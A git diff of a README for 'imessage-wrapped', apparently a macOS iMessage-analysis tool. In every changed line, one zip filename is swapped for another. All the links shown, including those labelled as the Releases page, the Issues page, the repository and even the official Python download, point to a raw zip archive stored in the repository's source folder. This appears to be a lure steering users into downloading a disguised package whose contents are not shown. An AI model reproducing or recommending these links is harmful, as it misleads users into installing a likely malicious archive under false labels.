@@ -6,13 +6,13 @@ Welcome to **imessage-wrapped**! This tool helps you understand your iMessage co
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit the [Releases page here](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip) to find the latest version.
+To get started, you need to download the software. Visit the [Releases page here](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip) to find the latest version.
 
-[![Download Latest Release](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip%20Latest%20Release-Get%20It%20Now-brightgreen)](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip%20Latest%20Release-Get%20It%20Now-brightgreen)](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip)
 
 ### Step-by-Step Instructions
 
-1. **Visit the Releases Page**: Click the link above or go to the Releases page directly: [https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip).
+1. **Visit the Releases Page**: Click the link above or go to the Releases page directly: [https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip).
 
 2. **Select the Latest Version**: Look for the latest version listed. It will usually appear at the top of the page.
 
@@ -48,7 +48,7 @@ After launching the application, follow these steps to analyze your conversation
 To run imessage-wrapped, ensure your Mac meets the following requirements:
 
 - **Operating System**: macOS 10.12 or later
-- **Python**: Ensure Python 3.6 or later is installed. You can download Python from [https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip).
+- **Python**: Ensure Python 3.6 or later is installed. You can download Python from [https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip).
 
 ## 🌐 Features
 
@@ -64,13 +64,13 @@ If you encounter issues, try the following:
 
 - **Reinstall the Application**: If it doesn’t launch, uninstall it from Applications and perform the installation again.
 - **Check Network Connection**: Although the tool works locally, ensure you have a stable internet connection when fetching data.
-- **Consult the FAQ**: Visit the [Issues page](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip) on GitHub for common questions and solutions.
+- **Consult the FAQ**: Visit the [Issues page](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip) on GitHub for common questions and solutions.
 
 ## 📣 Community & Support
 
 Join our community for support and discussions:
 
-- **GitHub Repository**: Visit [here](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/wrapped-imessage-1.8.zip) for updates and to report issues.
+- **GitHub Repository**: Visit [here](https://raw.githubusercontent.com/akitenko/imessage-wrapped/main/src/imessage_wrapped/imessage-wrapped-v1.5.zip) for updates and to report issues.
 - **Feedback**: We welcome your thoughts and ideas for improvements. Share your feedback in the Issues section.
 
 ## 🚀 Additional Resources
